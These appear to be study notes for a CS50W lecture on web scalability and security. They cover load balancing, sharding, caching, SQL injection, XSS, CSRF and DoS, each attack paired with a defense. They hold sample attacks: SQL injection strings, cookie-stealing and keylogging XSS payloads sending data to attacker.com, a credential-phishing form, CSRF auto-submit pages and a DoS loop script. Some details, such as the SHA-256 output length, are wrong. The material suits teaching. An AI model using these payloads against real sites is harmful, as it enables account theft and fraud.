# CS50W Lecture 8: Scalability and Security

## Table of Contents
- [Part 1: Scalability](#part-1-scalability)
  - [Server Scaling](#server-scaling)
  - [Load Balancing](#load-balancing)
  - [Session Management](#session-management)
  - [Database Scaling](#database-scaling)
  - [Caching Strategies](#caching-strategies)
- [Part 2: Security](#part-2-security)
  - [Source Code Security](#source-code-security)
  - [Cryptography](#cryptography)
  - [Database Security](#database-security)
  - [Web Application Attacks](#web-application-attacks)
  - [Defense Mechanisms](#defense-mechanisms)

---

## Part 1: Scalability

### What is Scalability?

**Scalability** is the ability of a web application to handle increasing amounts of traffic and users without degrading performance or crashing.

**The Core Problem:**
- Servers can only process a finite number of operations per second (measured in hertz/gigahertz)
- Each server has limited CPU, memory, and network capacity
- As users increase, a single server becomes a bottleneck

**Key Concept:** Before deploying, you need to **benchmark** your server to understand its capacity limits. Never wait until production to discover these limits!

---

### Server Scaling

#### 1. Vertical Scaling (Scaling Up)

**Definition:** Adding more resources to a single server (more CPU, RAM, storage)

**Analogy:** Upgrading your laptop with more RAM and a faster processor

**Advantages:**
- Simple to implement
- No code changes required
- All data stays in one place

**Disadvantages:**
- Physical hardware limits (you can't infinitely upgrade one machine)
- Expensive at high scales
- Single point of failure (if this server goes down, everything stops)
- Downtime required for upgrades

**Use Case:** Small to medium applications with predictable traffic

---

#### 2. Horizontal Scaling (Scaling Out)

**Definition:** Adding more servers to distribute the workload

**Analogy:** Instead of one super-worker, hire multiple regular workers

**Advantages:**
- Nearly unlimited scaling potential
- Better fault tolerance (if one server fails, others continue)
- Can scale gradually based on needs
- More cost-effective at large scales

**Disadvantages:**
- More complex architecture
- Requires load balancing
- Session management challenges
- Data synchronization issues

**Use Case:** Large applications with variable or high traffic

---

### Load Balancing

A **load balancer** sits between users and your servers, distributing incoming requests across multiple servers.

#### Load Balancing Algorithms

**1. Random Choice**
```
Request arrives → Pick random server → Forward request
```
- **Pros:** Simple, fast decision-making
- **Cons:** Can create uneven distribution over small samples

**2. Round Robin**
```
Request 1 → Server A
Request 2 → Server B
Request 3 → Server C
Request 4 → Server A (cycle repeats)
```
- **Pros:** Even distribution over time
- **Cons:** Doesn't account for server load or request complexity

**3. Fewest Connections**
```
Request arrives → Check all servers → Send to server with least active connections
```
- **Pros:** More intelligent distribution based on actual load
- **Cons:** Slightly slower decision-making, doesn't account for request complexity

#### Load Balancer Trade-offs

**Important Consideration:** The load balancer itself can become a bottleneck! Don't over-engineer it.

**Solution:** Keep load balancing logic simple and efficient. Complex algorithms may hurt more than help.

---

### Session Management

**The Problem:** When users are distributed across multiple servers, how do you maintain their session state (login status, shopping cart, preferences)?

#### Solution 1: Sticky Sessions

**Concept:** Once a user connects to a server, always route them to that same server

**Implementation:**
- Load balancer stores a mapping: `User → Server`
- Uses cookies to identify returning users
- Routes user back to their "assigned" server

**Advantages:**
- Simple to implement
- No session synchronization needed
- Fast (no database lookups)

**Disadvantages:**
- Uneven load distribution (users stick to servers even if underutilized)
- If a server goes down, all its users lose sessions
- Difficult to perform server maintenance

---

#### Solution 2: Sessions in Database

**Concept:** Store all session data in a centralized database that all servers can access

**Implementation:**
```python
# Server A: User logs in
db.execute("INSERT INTO sessions (user_id, token) VALUES (?, ?)", (user_id, token))

# Server B: User makes request
session = db.execute("SELECT * FROM sessions WHERE token = ?", (token,))
```

**Advantages:**
- Any server can handle any user
- Better load distribution
- Sessions survive server failures
- Easy to manage and monitor

**Disadvantages:**
- Database becomes a bottleneck
- Added latency for every request (network round-trip)
- Database is now a single point of failure
- Requires database scaling strategies

---

#### Solution 3: Client-Side Sessions (Cookies)

**Concept:** Store session data on the user's browser and send it with every request

**Implementation:**
```python
# Flask example with signed cookies
from flask import session

# Server stores data in cookie
session['user_id'] = 123
session['role'] = 'admin'

# Cookie sent with every request
# Server can read it without database lookup
```

**Advantages:**
- Zero server-side storage needed
- No database queries for session data
- Perfectly distributed (each user carries their own data)
- No synchronization issues

**Disadvantages:**
- Security risks (cookies can be stolen or modified)
- Size limitations (typically 4KB per cookie)
- Privacy concerns (user data transmitted with every request)
- Requires cryptographic signing to prevent tampering

**Security Note:** Use signed cookies with a secret key. Frameworks like Flask handle this automatically.

---

### Autoscaling

**Concept:** Automatically adjust the number of servers based on current traffic

**The Problem:**
- Traffic varies throughout the day/week/year
- Too few servers → crashes and slow performance
- Too many servers → wasted money on idle resources

**How Autoscaling Works:**
```
1. Monitor metrics (CPU usage, request count, response time)
2. If metrics exceed threshold → spin up new servers
3. If metrics drop below threshold → shut down servers
4. Maintain minimum and maximum server counts
```

**Configuration Example:**
```yaml
Autoscaling Rules:
  - Minimum servers: 2
  - Maximum servers: 20
  - Scale up when: CPU > 70% for 5 minutes
  - Scale down when: CPU < 30% for 10 minutes
```

**Benefits:**
- Cost optimization (pay only for what you need)
- Automatic response to traffic spikes
- Better resource utilization

**Cloud Providers:** AWS, Google Cloud, Azure all offer autoscaling services

---

### Server Health Monitoring

**Heartbeat System:** Servers periodically send signals to the load balancer to indicate they're functioning properly

```
Server A → "I'm alive!" (every 10 seconds) → Load Balancer
Server B → "I'm alive!" (every 10 seconds) → Load Balancer
Server C → [no signal] → Load Balancer marks as down
```

**Trade-off:**
- **Faster heartbeats:** More current status, quicker failure detection
- **Slower heartbeats:** Less network overhead, reduced server load

**Typical interval:** 5-30 seconds depending on requirements

---

## Database Scaling

### Database Partitioning

Splitting large databases into smaller, more manageable pieces for better performance.

#### 1. Vertical Partitioning

**Definition:** Reducing the number of columns in a table by splitting it into multiple related tables

**Example:**

**Before (Single Table):**
```sql
CREATE TABLE flights (
    id INT,
    origin VARCHAR(100),
    origin_code VARCHAR(3),
    destination VARCHAR(100),
    destination_code VARCHAR(3),
    duration INT
);
```

**After (Vertical Partitioning):**
```sql
CREATE TABLE locations (
    id INT,
    name VARCHAR(100),
    code VARCHAR(3)
);

CREATE TABLE flights (
    id INT,
    origin_id INT,  -- Foreign key to locations
    destination_id INT,  -- Foreign key to locations
    duration INT
);
```

**Benefits:**
- Eliminates data redundancy
- Smaller table size
- Faster queries when you don't need all columns
- Better data organization

**Use Case:** When tables have many columns and queries typically only need a subset

---

#### 2. Horizontal Partitioning

**Definition:** Splitting tables by rows into logical groups

**Example:**

**Before (Single Table):**
```sql
CREATE TABLE flights (
    id INT,
    origin VARCHAR(3),
    destination VARCHAR(3),
    type VARCHAR(20),
    duration INT
);
-- Contains 1,000,000 flights (domestic + international)
```

**After (Horizontal Partitioning):**
```sql
CREATE TABLE domestic_flights (
    id INT,
    origin VARCHAR(3),
    destination VARCHAR(3),
    duration INT
);
-- Contains 750,000 flights

CREATE TABLE international_flights (
    id INT,
    origin VARCHAR(3),
    destination VARCHAR(3),
    duration INT
);
-- Contains 250,000 flights
```

**Benefits:**
- Faster queries (searching smaller datasets)
- Can be geographically distributed
- Parallel query processing
- Easier to maintain and backup

**Challenges:**
- More complex application code
- Cross-partition queries are slower
- Schema changes affect multiple tables

---

### Database Sharding

**Definition:** Distributing database partitions across different physical servers

**Example Architecture:**
```
Application Server
        ↓
    Shard Router
    ↓    ↓    ↓
  DB1   DB2   DB3
  (A-H) (I-P) (Q-Z)
```

**Sharding Strategy - By User:**
```python
# Users A-H go to Database 1
# Users I-P go to Database 2
# Users Q-Z go to Database 3

def get_shard(username):
    first_letter = username[0].upper()
    if first_letter <= 'H':
        return database_1
    elif first_letter <= 'P':
        return database_2
    else:
        return database_3
```

**Benefits:**
- Distributes load across multiple servers
- Each database is smaller and faster
- Can scale almost infinitely

**Challenges:**
- Complex queries across shards
- Rebalancing if data distribution changes
- More points of failure

---

### Database Replication

Creating copies of databases to improve performance and reliability.

#### 1. Single-Primary Replication

**Architecture:**
```
        PRIMARY DATABASE (Read/Write)
               ↓
    ┌──────────┼──────────┐
    ↓          ↓          ↓
REPLICA 1  REPLICA 2  REPLICA 3
(Read Only)(Read Only)(Read Only)
```

**How It Works:**
1. All write operations (INSERT, UPDATE, DELETE) go to primary
2. Primary automatically replicates changes to replicas
3. Read operations can use any replica
4. Reduces load on primary database

**Advantages:**
- Simple to implement
- Consistent write operations
- Improved read performance
- Automatic failover (if primary fails, promote replica)

**Disadvantages:**
- Primary is still a bottleneck for writes
- Replication lag (replicas may be slightly behind)
- Single point of failure for writes

**Use Case:** Read-heavy applications (blogs, news sites, e-commerce browsing)

---

#### 2. Multi-Primary Replication

**Architecture:**
```
PRIMARY DB 1 ←→ PRIMARY DB 2 ←→ PRIMARY DB 3
(Read/Write)    (Read/Write)    (Read/Write)
```

**How It Works:**
1. Multiple databases can handle both reads and writes
2. Each primary replicates changes to other primaries
3. More complex conflict resolution needed

**Conflict Example:**
```
Time: 10:00:00
DB1: User registers as ID=1001
DB2: User registers as ID=1001 (same time!)
→ Conflict! Both databases assigned same ID
```

**Conflict Resolution Strategies:**
- Timestamp-based (last write wins)
- Version vectors
- Custom business logic
- Manual intervention

**Advantages:**
- No single point of failure
- Better write performance
- Geographic distribution (users write to nearest database)

**Disadvantages:**
- Complex to implement
- Potential for conflicts
- More difficult to maintain data consistency

---

### Caching Strategies

**Caching:** Storing frequently accessed data in fast-access storage to avoid repeated expensive operations

#### 1. Client-Side Caching (Browser Cache)

**How It Works:**
```
First Visit:
Browser → Request page → Server
Server → Send page + Cache-Control header
Browser → Store files locally

Subsequent Visits:
Browser → Check cache → Use stored files (no server request!)
```

**HTTP Cache Headers:**
```http
Cache-Control: max-age=86400
```
- `max-age=86400`: Cache for 86,400 seconds (1 day)
- `no-cache`: Always check with server before using cache
- `no-store`: Never cache this resource

**ETag (Entity Tag):**
```http
Response 1:
ETag: "33a64df551425fcc55e4d42a148795d9f25f89d4"

Request 2:
If-None-Match: "33a64df551425fcc55e4d42a148795d9f25f89d4"

Response 2:
304 Not Modified (use your cached version)
```

**Benefits:**
- Dramatically reduces server load
- Faster page loads for users
- Reduced bandwidth usage

**Best Practices:**
- Cache static assets (CSS, JavaScript, images) for long periods
- Use short cache times for frequently updated content
- Never cache private/sensitive data without `private` directive

---

#### 2. Server-Side Caching

**How It Works:**
```
Request → Server → Check cache
                   ↓ Cache miss
                   Query database
                   ↓
                   Store in cache
                   ↓
                   Return result

Next Request → Server → Check cache
                        ↓ Cache hit!
                        Return cached result (skip database)
```

**Implementation Example (Python with Redis):**
```python
import redis
import json

cache = redis.Redis(host='localhost', port=6379)

def get_user(user_id):
    # Try cache first
    cached = cache.get(f'user:{user_id}')
    if cached:
        return json.loads(cached)
    
    # Cache miss - query database
    user = db.execute("SELECT * FROM users WHERE id = ?", user_id)
    
    # Store in cache (expires in 1 hour)
    cache.setex(f'user:{user_id}', 3600, json.dumps(user))
    
    return user
```

**Cache Invalidation Strategies:**

**1. Time-Based Expiration:**
```python
# Cache expires after 1 hour
cache.setex('key', 3600, value)
```

**2. Event-Based Invalidation:**
```python
# When user updates profile, delete cache
def update_user(user_id, new_data):
    db.execute("UPDATE users SET ... WHERE id = ?", user_id)
    cache.delete(f'user:{user_id}')  # Invalidate cache
```

**3. Write-Through Cache:**
```python
# Update both database and cache simultaneously
def update_user(user_id, new_data):
    db.execute("UPDATE users SET ... WHERE id = ?", user_id)
    cache.set(f'user:{user_id}', json.dumps(new_data))
```

**Common Caching Solutions:**
- **Redis:** In-memory data store, very fast
- **Memcached:** Simple key-value cache
- **CDN:** Content Delivery Network for static files

---

## Part 2: Security

### Source Code Security

#### Git and GitHub Security

**Critical Rule:** Never commit sensitive information to repositories!

**Common Mistakes:**
```python
# ❌ NEVER DO THIS
API_KEY = "sk_live_51H8x9zK2..."
DATABASE_PASSWORD = "MySecret123"
SECRET_KEY = "super-secret-key"
```

**Why This is Dangerous:**
- Once committed, it's in version history forever
- Even if you delete it in a new commit, it's still visible in old commits
- Public repositories expose secrets to everyone
- Private repositories can be compromised

**The Right Way:**
```python
# ✅ Use environment variables
import os

API_KEY = os.environ.get('API_KEY')
DATABASE_PASSWORD = os.environ.get('DB_PASSWORD')
SECRET_KEY = os.environ.get('SECRET_KEY')
```

**Setting Environment Variables:**
```bash
# Linux/Mac
export API_KEY="sk_live_51H8x9zK2..."

# Windows
set API_KEY=sk_live_51H8x9zK2...

# .env file (never commit this!)
API_KEY=sk_live_51H8x9zK2...
DB_PASSWORD=MySecret123
```

**If You Accidentally Commit Secrets:**
1. ⚠️ Assume the secret is compromised
2. Immediately rotate/change the credentials
3. Consider rewriting Git history (complex and risky)
4. Add `.env` to `.gitignore` to prevent future mistakes

---

### HTML Security

#### Phishing Attacks

**The Threat:** Attackers can easily copy your website's HTML to create convincing fake sites

**Example Attack:**
```html
<!-- Legitimate bank site: https://realbank.com -->
<form action="https://realbank.com/login" method="post">
    <input type="text" name="username">
    <input type="password" name="password">
    <button>Login</button>
</form>

<!-- Attacker's fake site: https://rea1bank.com (note the "1") -->
<form action="https://attacker.com/steal" method="post">
    <input type="text" name="username">
    <input type="password" name="password">
    <button>Login</button>
</form>
```

**Deceptive Links:**
```html
<!-- What user sees vs what link actually does -->
<a href="https://attacker.com/malware">
    Click here to view your bank statement
</a>

<!-- Even more deceptive -->
<a href="https://attacker.com">
    https://realbank.com/statement
</a>
```

**User Protection:**
- Always check the URL in the browser address bar
- Hover over links to see actual destination
- Look for HTTPS and valid certificates
- Be suspicious of emails with urgent requests

**Website Protection:**
- Use HTTPS to prevent man-in-the-middle attacks
- Implement email verification for sensitive actions
- Use multi-factor authentication
- Educate users about phishing

---

### Cryptography

**Purpose:** Protect data transmitted across networks from being read by intermediaries

#### Secret-Key Cryptography (Symmetric Encryption)

**Concept:** Both sender and receiver share the same secret key

**Process:**
```
Plaintext → [Encryption with Key] → Ciphertext
Ciphertext → [Decryption with Key] → Plaintext
```

**Example:**
```
Message: "Hello World"
Secret Key: "MySecretKey123"
Encrypted: "X7k2#@!mz9p"

To decrypt: Need the same "MySecretKey123"
```

**The Key Distribution Problem:**
- How do you safely share the secret key?
- If you send it over the network, it can be intercepted
- If intercepted, all encrypted messages can be decrypted

**Use Cases:**
- Encrypting local files
- Secure communication between trusted parties
- Internal system communication

---

#### Public-Key Cryptography (Asymmetric Encryption)

**Concept:** Uses two related keys - a public key and a private key

**Key Properties:**
- **Public Key:** Can only encrypt, shared openly
- **Private Key:** Can decrypt, never shared
- Data encrypted with public key can only be decrypted with private key

**Process:**
```
Sender:
1. Gets recipient's PUBLIC key
2. Encrypts message with public key
3. Sends encrypted message

Recipient:
4. Receives encrypted message
5. Decrypts with their PRIVATE key
6. Reads original message

Interceptor:
- Has public key (everyone does)
- Has encrypted message
- CANNOT decrypt without private key
```

**Real-World Example (HTTPS):**
```
1. Your browser visits https://bank.com
2. Bank sends its public key to your browser
3. Browser encrypts data with bank's public key
4. Encrypted data sent to bank
5. Bank decrypts with its private key
6. Even if someone intercepts, they can't read it!
```

**Benefits:**
- Solves key distribution problem
- No need to share secrets beforehand
- Foundation of modern internet security

**Use Cases:**
- HTTPS/SSL
- Email encryption (PGP)
- Digital signatures
- Cryptocurrency

---

### Database Security

#### Password Hashing

**NEVER store passwords in plain text!**

**Wrong Way:**
```sql
CREATE TABLE users (
    id INT,
    username VARCHAR(50),
    password VARCHAR(50)  -- ❌ Storing "password123"
);
```

**Right Way: Use Hash Functions**

**Hash Function Properties:**
- One-way (cannot reverse)
- Deterministic (same input → same output)
- Fast to compute
- Small changes → completely different output

**Example:**
```python
import hashlib

password = "mypassword123"
hashed = hashlib.sha256(password.encode()).hexdigest()
# Output: "b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86"
```

**Login Process:**
```python
# Registration
def register(username, password):
    hashed_password = hash_function(password)
    db.execute("INSERT INTO users (username, password) VALUES (?, ?)", 
               (username, hashed_password))

# Login
def login(username, password):
    stored_hash = db.execute("SELECT password FROM users WHERE username = ?", 
                             username)
    entered_hash = hash_function(password)
    
    if entered_hash == stored_hash:
        return "Login successful"
    else:
        return "Invalid credentials"
```

**Advanced: Salted Hashes**

**Problem:** Attackers can use pre-computed hash tables (rainbow tables)

**Solution:** Add a random "salt" to each password before hashing

```python
import os
import hashlib

def hash_password(password):
    salt = os.urandom(32)  # Random 32-byte salt
    hashed = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
    return salt + hashed  # Store both salt and hash

def verify_password(stored_password, provided_password):
    salt = stored_password[:32]  # Extract salt
    stored_hash = stored_password[32:]
    new_hash = hashlib.pbkdf2_hmac('sha256', provided_password.encode(), salt, 100000)
    return new_hash == stored_hash
```

---

#### Database Leakage

**Definition:** Unintentionally revealing information through application behavior

**Example - Password Reset Page:**

**Vulnerable Implementation:**
```python
@app.route("/reset", methods=["POST"])
def reset_password():
    email = request.form.get("email")
    user = db.execute("SELECT * FROM users WHERE email = ?", email)
    
    if user:
        send_reset_email(email)
        return "Reset link sent to your email"
    else:
        return "Email not found in our system"  # ❌ Information leak!
```

**The Problem:**
- Attacker can determine which emails are registered
- Can build list of user emails
- Can target specific users for phishing

**Secure Implementation:**
```python
@app.route("/reset", methods=["POST"])
def reset_password():
    email = request.form.get("email")
    user = db.execute("SELECT * FROM users WHERE email = ?", email)
    
    if user:
        send_reset_email(email)
    
    # Always show same message
    return "If that email exists, a reset link has been sent"  # ✅ No leak!
```

**Other Leakage Examples:**
- Different response times for valid vs invalid usernames
- Error messages revealing system information
- API endpoints returning user existence
- Registration forms confirming if email is taken

---

#### SQL Injection

**Definition:** Attackers insert malicious SQL code into input fields that gets executed by the database

**Vulnerable Code:**
```python
@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")
    
    # ❌ DANGEROUS - Never do this!
    query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
    user = db.execute(query).first()
```

**The Attack:**
```python
# Attacker enters as username:
admin' --

# Resulting query:
SELECT * FROM users WHERE username = 'admin' --' AND password = ''

# The -- comments out the rest, so password is ignored!
# Attacker logs in as admin without knowing password
```

**More Dangerous Attacks:**
```sql
-- Delete all users
'; DROP TABLE users; --

-- Extract all passwords
' OR '1'='1

-- Access other users' data
' UNION SELECT * FROM credit_cards --
```

**The Fix: Parameterized Queries**

```python
# ✅ Safe - using parameterized query
@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")
    
    # Library automatically escapes dangerous characters
    user = db.execute(
        "SELECT * FROM users WHERE username = ? AND password = ?",
        (username, password)
    ).first()
```

**Why This Works:**
- The `?` placeholders are safely replaced by the library
- Special characters are automatically escaped
- SQL structure cannot be modified by user input

**Best Practices:**
- Always use parameterized queries or ORM libraries
- Never concatenate user input into SQL strings
- Use libraries like SQLAlchemy that handle this automatically
- Implement input validation as additional layer

---

### Web Application Attacks

#### Cross-Site Scripting (XSS)

**Definition:** Injecting malicious JavaScript code that runs in other users' browsers

**Type 1: URL-Based XSS**

**Vulnerable Application:**
```python
@app.route("/")
def index():
    return "Hello, world!"

@app.errorhandler(404)
def page_not_found(e):
    # ❌ Dangerous - renders user input directly
    return "Not Found: " + request.path
```

**The Attack:**
```
User visits: http://example.com/<script>alert('XSS!')</script>

Server returns: Not Found: <script>alert('XSS!')</script>

Browser executes the script!
```

**More Dangerous Attack:**
```javascript
// Steal user's cookies and send to attacker
<script>
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**Type 2: Stored XSS (More Dangerous)**

**Vulnerable Message Board:**
```python
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        content = request.form.get("message")
        # Store in database
        db.execute("INSERT INTO messages (content) VALUES (?)", content)
    
    messages = db.execute("SELECT * FROM messages").fetchall()
    
    # ❌ Renders stored content without escaping
    return render_template("index.html", messages=messages)
```

```html
<!-- template.html -->
{% for message in messages %}
    <p>{{ message.content | safe }}</p>  <!-- ❌ 'safe' disables escaping -->
{% endfor %}
```

**The Attack:**
```
1. Attacker posts message: <script>steal_cookies()</script>
2. Script stored in database
3. Every user who views the page executes the script
4. All users' cookies are stolen
```

**Real-World Attack Examples:**
```javascript
// Redirect all users to malicious site
<script>window.location = 'https://attacker.com'</script>

// Replace entire page content
<script>document.body.innerHTML = 'This site has been hacked!'</script>

// Keylogger
<script>
document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/log?key=' + e.key);
});
</script>
```

**Defense: Escape User Input**

```python
# ✅ Safe - Flask automatically escapes by default
return render_template("index.html", messages=messages)
```

```html
<!-- template.html -->
{% for message in messages %}
    <p>{{ message.content }}</p>  <!-- ✅ Escaped automatically -->
{% endfor %}
```

**What Escaping Does:**
```
User input: <script>alert('XSS')</script>
Escaped:    &lt;script&gt;alert('XSS')&lt;/script&gt;
Displayed:  <script>alert('XSS')</script>  (as text, not executed)
```

**XSS Prevention Checklist:**
- ✅ Always escape user input before displaying
- ✅ Use framework's built-in escaping (don't disable it)
- ✅ Validate input on server-side
- ✅ Use Content Security Policy (CSP) headers
- ✅ Never use `innerHTML` with user data
- ✅ Sanitize data before storing in database

---

#### Cross-Site Request Forgery (CSRF)

**Definition:** Tricking users into performing unwanted actions on websites where they're authenticated

**The Attack Scenario:**

**Step 1: Bank's Transfer Endpoint**
```python
# Simple bank transfer (VULNERABLE)
@app.route("/transfer", methods=["GET"])
def transfer():
    recipient = request.args.get("to")
    amount = request.args.get("amount")
    
    # If user is logged in, transfer money
    if current_user.is_authenticated:
        transfer_money(current_user.id, recipient, amount)
        return "Transfer successful"
```

**Step 2: Attacker's Malicious Website**
```html
<!-- attacker-site.com -->
<h1>Free iPhone Giveaway!</h1>
<a href="https://yourbank.com/transfer?to=attacker&amount=5000">
    Click here to claim your prize!
</a>
```

**What Happens:**
1. User is logged into their bank in another tab
2. User clicks the malicious link
3. Bank sees authenticated user making transfer request
4. Money is transferred to attacker
5. User doesn't realize what happened

**Even More Sneaky Attack:**
```html
<!-- Invisible attack - executes automatically -->
<body>
    <img src="https://yourbank.com/transfer?to=attacker&amount=5000">
    <!-- Browser automatically makes GET request to load "image" -->
</body>
```

**Defense 1: Use POST Requests**

```python
# Better, but still vulnerable
@app.route("/transfer", methods=["POST"])
def transfer():
    recipient = request.form.get("to")
    amount = request.form.get("amount")
    transfer_money(current_user.id, recipient, amount)
```

**Attack Still Works with POST:**
```html
<!-- attacker-site.com -->
<body onload="document.forms[0].submit()">
    <form action="https://yourbank.com/transfer" method="post">
        <input type="hidden" name="to" value="attacker">
        <input type="hidden" name="amount" value="5000">
    </form>
</body>
```

**Defense 2: CSRF Tokens (The Solution)**

**How CSRF Tokens Work:**
```
1. Server generates unique random token for each form
2. Token stored in server session
3. Token embedded in form as hidden field
4. When form submitted, server verifies token matches
5. Attacker can't forge requests (they don't know the token)
```

**Implementation:**

```python
# Flask with CSRF protection
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key'
csrf = CSRFProtect(app)

@app.route("/transfer", methods=["POST"])
def transfer():
    # Flask automatically validates CSRF token
    recipient = request.form.get("to")
    amount = request.form.get("amount")
    transfer_money(current_user.id, recipient, amount)
```

```html
<!-- Form with CSRF token -->
<form action="/transfer" method="post">
    {% csrf_token %}  <!-- Django -->
    <!-- or -->
    {{ form.csrf_token }}  <!-- Flask-WTF -->
    
    <input type="text" name="to">
    <input type="number" name="amount">
    <button type="submit">Transfer</button>
</form>
```

**Generated HTML:**
```html
<form action="/transfer" method="post">
    <input type="hidden" name="csrf_token" 
           value="ImY4NjM5ZGYxZDVmMWE4ZjEzNTM1N2Y0MzQzYWI3NTcwZTc3NGEyNjki">
    <input type="text" name="to">
    <input type="number" name="amount">
    <button type="submit">Transfer</button>
</form>
```

**Why Attackers Can't Bypass This:**
- Token is unique per session and unpredictable
- Attacker can't read the token (cross-origin restrictions)
- Token changes with each form generation
- Server rejects requests with missing/invalid tokens

**CSRF Protection Checklist:**
- ✅ Use POST/PUT/DELETE for state-changing operations
- ✅ Implement CSRF tokens for all forms
- ✅ Verify tokens server-side on every request
- ✅ Use framework's built-in CSRF protection
- ✅ Set SameSite cookie attribute
- ✅ Require re-authentication for sensitive actions

---

### API Security

#### API Keys

**Purpose:** Authenticate and track API usage

**How API Keys Work:**
```
1. User registers for API access
2. Server generates unique key: "sk_live_51H8x9zK2..."
3. User includes key with every request
4. Server validates key before processing request
```

**Implementation:**
```python
# Generating API key
import secrets

def generate_api_key():
    return secrets.token_urlsafe(32)

# Using API key
@app.route("/api/data")
def get_data():
    api_key = request.headers.get('X-API-Key')
    
    user = db.execute("SELECT * FROM users WHERE api_key = ?", api_key)
    if not user:
        return {"error": "Invalid API key"}, 401
    
    # Key valid - process request
    return {"data": "sensitive information"}
```

**Request Example:**
```bash
curl -H "X-API-Key: sk_live_51H8x9zK2..." \
     https://api.example.com/data
```

**Benefits:**
- **Authentication:** Verify who is making the request
- **Authorization:** Control what resources user can access
- **Rate Limiting:** Track and limit requests per user
- **Analytics:** Monitor API usage patterns
- **Revocation:** Disable compromised keys without changing passwords

---

#### Rate Limiting

**Purpose:** Prevent abuse by limiting number of requests per time period

**Common Limits:**
- Free tier: 100 requests/hour
- Paid tier: 10,000 requests/hour
- Burst limit: 10 requests/second

**Implementation:**
```python
from flask_limiter import Limiter

limiter = Limiter(app, key_func=lambda: request.headers.get('X-API-Key'))

@app.route("/api/data")
@limiter.limit("100 per hour")
def get_data():
    return {"data": "information"}
```

**Response When Limited:**
```json
{
    "error": "Rate limit exceeded",
    "retry_after": 3600
}
```

**Why Rate Limiting Matters:**
- Prevents DoS attacks
- Ensures fair resource distribution
- Protects infrastructure costs
- Encourages users to upgrade to paid tiers

---

### Denial of Service (DoS) Attacks

#### DoS Attack

**Definition:** Overwhelming a server with requests to make it unavailable to legitimate users

**Simple DoS Attack:**
```python
# Attacker's script
import requests

while True:
    requests.get("https://target-site.com")
    # Sends thousands of requests per second
```

**Effect:**
- Server CPU maxes out
- Memory exhausted
- Legitimate users can't access site
- Site becomes unavailable

---

#### DDoS (Distributed Denial of Service)

**Definition:** Using many computers (botnet) to attack a single target simultaneously

**Attack Scale:**
```
Normal traffic:    1,000 requests/second
DDoS attack:   1,000,000 requests/second
```

**How Botnets Work:**
```
Attacker
   ↓
Command & Control Server
   ↓ ↓ ↓ ↓ ↓
10,000 infected computers
   ↓ ↓ ↓ ↓ ↓
TARGET WEBSITE → Overwhelmed
```

**Defense Strategies:**

**1. Rate Limiting**
```python
# Limit requests per IP address
@limiter.limit("10 per minute")
def homepage():
    return render_template("index.html")
```

**2. IP Blacklisting**
```python
BLACKLISTED_IPS = ['192.168.1.100', '10.0.0.50']

@app.before_request
def check_ip():
    if request.remote_addr in BLACKLISTED_IPS:
        abort(403)
```

**3. CAPTCHA for Suspicious Activity**
```html
<!-- Show CAPTCHA if too many requests -->
<form action="/login" method="post">
    <input type="text" name="username">
    <input type="password" name="password">
    <div class="g-recaptcha" data-sitekey="your-site-key"></div>
    <button>Login</button>
</form>
```

**4. CDN and DDoS Protection Services**
- Cloudflare
- AWS Shield
- Akamai
- Absorb attack traffic before it reaches your servers

**5. Infrastructure Level Defense**
- Multiple servers with load balancing
- Autoscaling to handle traffic spikes
- Geographic distribution
- Monitoring and alerting systems

**The Reality:**
- Large DDoS attacks (100+ Gbps) require ISP/infrastructure-level defense
- Application-level defenses help but aren't sufficient alone
- Professional DDoS protection services are often necessary
- It often comes down to resources: attacker vs defender

---

## Security Best Practices Summary

### Development
- ✅ Never commit secrets to repositories
- ✅ Use environment variables for sensitive data
- ✅ Keep dependencies updated
- ✅ Use security linters and scanners
- ✅ Implement proper error handling (don't expose system details)

### Authentication & Authorization
- ✅ Hash passwords with salt
- ✅ Implement multi-factor authentication
- ✅ Use secure session management
- ✅ Set secure cookie attributes (HttpOnly, Secure, SameSite)
- ✅ Implement account lockout after failed attempts

### Input Validation
- ✅ Validate all user input server-side
- ✅ Use parameterized queries (prevent SQL injection)
- ✅ Escape output (prevent XSS)
- ✅ Implement CSRF tokens
- ✅ Validate file uploads

### Communication
- ✅ Use HTTPS everywhere
- ✅ Implement proper CORS policies
- ✅ Use Content Security Policy headers
- ✅ Keep security headers updated

### Monitoring
- ✅ Log security events
- ✅ Monitor for suspicious activity
- ✅ Set up alerts for anomalies
- ✅ Regular security audits
- ✅ Penetration testing

---

## Scalability Best Practices Summary

### Server Architecture
- ✅ Design for horizontal scaling from the start
- ✅ Use load balancers for traffic distribution
- ✅ Implement health checks and monitoring
- ✅ Use autoscaling for variable traffic
- ✅ Separate concerns (web servers, app servers, databases)

### Database Optimization
- ✅ Index frequently queried columns
- ✅ Use connection pooling
- ✅ Implement caching strategies
- ✅ Consider read replicas for read-heavy apps
- ✅ Partition/shard large datasets

### Caching
- ✅ Cache static assets with long expiration
- ✅ Use CDN for global content delivery
- ✅ Implement server-side caching (Redis/Memcached)
- ✅ Cache database queries when appropriate
- ✅ Invalidate cache properly on updates

### Performance
- ✅ Minimize HTTP requests
- ✅ Compress responses (gzip/brotli)
- ✅ Lazy load images and content
- ✅ Use async operations where possible
- ✅ Optimize database queries

### Monitoring
- ✅ Track response times
- ✅ Monitor server resources (CPU, memory, disk)
- ✅ Set up error tracking
- ✅ Analyze traffic patterns
- ✅ Benchmark regularly

---

## Conclusion

**Scalability** and **Security** are not optional considerations - they're fundamental requirements for any production web application.

**Key Takeaways:**

1. **Plan for Scale Early:** It's much harder to retrofit scalability than to build it in from the start

2. **Defense in Depth:** Use multiple layers of security - never rely on a single defense mechanism

3. **Test Everything:** Benchmark performance, pen-test security, simulate failures

4. **Monitor Continuously:** You can't fix what you don't measure

5. **Stay Updated:** Security threats and scaling challenges evolve constantly

6. **Balance Trade-offs:** Every decision has costs - choose what makes sense for your application

Remember: A website that doesn't scale can't serve its users, and a website that isn't secure shouldn't serve anyone.

---

## Additional Resources

### Documentation
